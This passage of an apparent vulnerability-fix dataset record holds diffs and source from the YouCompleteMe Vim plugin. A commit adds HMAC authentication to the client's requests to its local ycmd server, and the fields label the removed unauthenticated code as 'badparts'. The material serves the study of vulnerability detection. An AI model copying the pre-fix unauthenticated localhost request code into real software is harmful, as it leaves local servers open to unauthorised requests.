),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]}],"source":"\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application\/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http:\/\/localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 'application\/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests\/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http:\/\/localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"},"\/python\/ycm\/youcompleteme.py":{"changes":[{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]},{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]}],"source":"\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http:\/\/localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info +='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server\/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https:\/\/github.com\/Valloric\/YouCompleteMe\/issues\/641\n#  https:\/\/github.com\/kennethreitz\/requests\/issues\/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN )\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug 